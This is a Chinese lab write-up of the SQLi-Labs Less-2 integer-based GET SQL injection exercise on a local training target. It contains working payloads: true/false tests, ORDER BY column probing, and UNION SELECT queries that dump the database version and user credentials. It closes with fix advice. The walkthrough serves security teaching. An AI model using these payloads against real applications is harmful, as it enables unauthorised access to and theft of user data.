SQLi-Labs Less-2：GET 数字型报错与联合查询注入

# SQLi-Labs # Web # SQL注入 # GET # 数字型 # UNION

一、题目信息

  • 题目：SQLi-Labs Less-2 - Error Based - Integer
  • 方向：Web / SQL Injection
  • 环境：本地授权 SQLi-Labs 靶场
  • 目标：确认 GET 参数存在数字型 SQL 注入，并读取数据库信息。
  • Flag：该靶场没有 flag，以成功读取数据库信息作为验证结果。

二、观察源码

第 2 关的入口仍然是 id 参数，但源码中的 SQL 与第 1 关不同：输入没有被单引号包裹。

$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";

这意味着参数会直接被当作数字表达式的一部分。它不需要先闭合单引号，可以直接追加 AND、ORDER BY 或 UNION SELECT。

三、确认数字型注入

正常请求：

http://127.0.0.1:18080/Less-2/?id=1
Your Login name:Dumb
Your Password:Dumb

提交永真和永假条件进行对比：

输入SQL 条件实际结果
1 and 1=1真条件返回 Dumb / Dumb
1 and 1=2假条件不返回用户信息

真假条件产生不同结果，说明输入可以改变 SQL 逻辑，注入点成立。

四、确认参数没有引号包裹

输入单个单引号：

id=1'
You have an error in your SQL syntax

报错说明单引号不是合法的数字表达式，进一步证明本关的注入点属于数字型。与第 1 关不同，直接提交 1 and 1=1 才是正确的起始形式。

和第 1 关的区别： 第 1 关原 SQL 是 id='$id'，需要先闭合单引号；第 2 关原 SQL 是 id=$id，无需闭合引号，直接连接逻辑表达式。

五、判断查询列数

id=1 order by 3#
id=1 order by 4#

第 3 列正常返回，第 4 列出现错误：

Unknown column '4' in 'order clause'

因此查询共有 3 列，可以使用三列 UNION SELECT。

六、联合查询读取数据库信息

将原结果置空，在三个返回位置中分别放入固定值、数据库名和版本号：

id=-1 union select 1,database(),version()#
Your Login name:security
Your Password:5.5.44-0ubuntu0.14.04.1

继续读取用户表，验证注入可以跨表获取数据：

id=-1 union select 1,group_concat(username),group_concat(password) from users#
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
URL 编码说明： 提交时要把 # 写成 %23，避免它被浏览器识别为 URL 片段。完整参数示例： ?id=-1%20union%20select%201%2Cdatabase()%2Cversion()%23

七、完整请求示例

GET /Less-2/?id=-1%20union%20select%201%2Cdatabase()%2Cversion()%23 HTTP/1.1
Host: 127.0.0.1:18080

解码后的 payload：

-1 union select 1,database(),version()#

八、漏洞原因与影响

根因是把 GET 参数直接拼接到数字型 SQL 表达式中。虽然这种写法不需要引号闭合，但参数依然可以注入逻辑运算和联合查询，导致查询结果被篡改，业务数据被读取。

九、修复建议

  • 使用预处理语句绑定参数，避免把 id 拼接进 SQL。
  • 对数字型参数使用整数转换和严格范围校验。
  • 关闭数据库详细报错，避免把 SQL 语法和版本信息返回给用户。
  • 数据库账号使用最小权限，限制读取非业务表。

十、复盘

第 2 关和第 1 关的核心区别是 SQL 中是否使用引号。先把源码里的拼接方式看清楚，再选择 payload：第 1 关先闭合单引号，第 2 关直接追加数字逻辑表达式。之后的列数判断和联合查询流程相同。
